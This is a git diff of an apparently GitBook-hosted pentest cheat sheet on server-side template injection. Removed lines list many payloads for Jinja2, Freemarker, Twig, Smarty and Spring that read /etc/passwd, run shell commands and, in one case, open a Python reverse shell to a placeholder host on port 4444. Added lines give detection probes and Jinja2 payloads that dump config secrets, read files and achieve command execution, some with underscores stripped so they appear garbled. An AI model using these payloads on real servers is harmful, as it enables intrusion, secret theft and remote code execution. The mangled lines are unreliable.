@@ -4,57 +4,65 @@
 
 Step 1: Find an injection point, attempt basic payloads and see if app is vulnerable to SSTI.
 
+Can be via input box, or in the URL
+
+Basic Identification:
+
 ```
-{{2*2}}[[3*3]]
-{{3*3}}
-{{3*'3'}}
-<%= 3 * 3 %>
-${6*6}
-${{3*3}}
-@(6+5)
-#{3*3}
-#{ 3 * 3 }
-{{dump(app)}}
-{{app.request.server.all|join(',')}}
-{{config.items()}}
-{{ [].class.base.subclasses() }}
-{{''.class.mro()[1].subclasses()}}
-{{ ''.__class__.__mro__[2].__subclasses__() }}
-{% raw %}
-{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
-{{'a'.toUpperCase()}} 
-{{ request }}
-{{self}}
-<%= File.open('/etc/passwd').read %>
-<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
-[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
-${"freemarker.template.utility.Execute"?new()("id")}
-{{app.request.query.filter(0,0,1024,{'options':'system'})}}
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
-{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
-{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
-{$smarty.version}
-{php}echo `id`;{/php}
-{{['id']|filter('system')}}
-{{['cat\x20/etc/passwd']|filter('system')}}
-{{['cat$IFS/etc/passwd']|filter('system')}}
-{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
-{{request|attr(["_"*2,"class","_"*2]|join)}}
-{{request|attr(["__","class","__"]|join)}}
-{{request|attr("__class__")}}
-{{request.__class__}}
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
-{% endraw %}
-${T(java.lang.System).getenv()}
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Exploit
+
+### Jinja2
+
+* Dump all the config variables, will show the secret key, if the variable is set
+
+```
+{{ config }} 
+```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### Jinja Injection without \<class 'object'>&#x20;
+
+* From the there is another way to get to RCE without using that class.&#x20;
+* \*\*\*\*If you manage to get to any function from those globals objects, you will be able to access **globals**.**builtins** and from there the RCE is very simple.&#x20;
+* You can find functions from the objects request, config and any other interesting global object you have access to with:&#x20;
+
+```
+{{ request.__class__.__dict__ }}
+application
+_load_form_data
+on_json_loading_failed ​ {{ config.class.dict }}
+init
+from_envvar
+from_pyfile
+from_object
+from_file
+from_json
+from_mapping
+get_namespace
+repr ​
+# You can iterate through children objects to find more
+```
+
+* Once you have found some functions you can recover the builtins with:
+
+```
+# Read File
+{{ request.class._load_form_data.globals.builtins.open("/etc/passwd").read() }} ​
+# RCE
+{{ config.class.from_envvar.globals.builtins.import("os").popen("ls").read() }} {{ config.class.from_envvar["globals"]["builtins"]"import".popen("ls").read() }} {{ (config|attr("class")).from_envvar["globals"]["builtins"]"import".popen("ls").read() }} ​
+{{ a }}​ ## Extra ## The global from config have a access to a function called import_string ## with this function you don't need to access the builtins {{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }} ​ 
+# All the bypasses seen in the previous sections are also valid
 ```
 
 If it is, the next step is determining the engine that is running the application&#x20;
